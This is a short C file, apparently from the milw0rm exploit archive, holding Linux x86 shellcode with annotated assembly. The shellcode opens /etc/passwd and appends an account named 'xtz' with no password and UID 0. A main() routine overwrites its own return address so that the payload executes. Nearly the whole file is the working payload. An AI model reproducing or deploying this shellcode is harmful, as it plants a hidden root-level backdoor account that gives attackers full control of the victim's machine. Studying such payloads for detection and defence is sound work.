/*
 * (linux/x86) adds user 'xtz' without password to /etc/passwd - 59 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x05"              // push $0x5

	//
	// <_exit>:
	//

	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\x31\xc9"              // xor %ecx,%ecx
	"\x66\xb9\x01\x04"      // mov $0x401,%cx
	"\x52"                  // push %edx
	"\x68\x73\x73\x77\x64"  // push $0x64777373
	"\x68\x63\x2f\x70\x61"  // push $0x61702f63
	"\x68\x2f\x2f\x65\x74"  // push $0x74652f2f
	"\x89\xe3"              // mov %esp,%ebx
	"\xcd\x80"              // int $0x80
	"\x68\x3a\x3a\x3a\x0a"  // push $0xa3a3a3a
	"\x68\x3a\x30\x3a\x30"  // push $0x303a303a
	"\x68\x78\x74\x7a\x3a"  // push $0x3a7a7478
	"\x89\xc3"              // mov %eax,%ebx
	"\xb0\x04"              // mov $0x4,%al
	"\x89\xe1"              // mov %esp,%ecx
	"\xb2\x0c"              // mov $0xc,%dl
	"\xcd\x80"              // int $0x80
	"\x6a\x01"              // push $0x1
	"\xeb\xc7";             // jmp <_exit>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]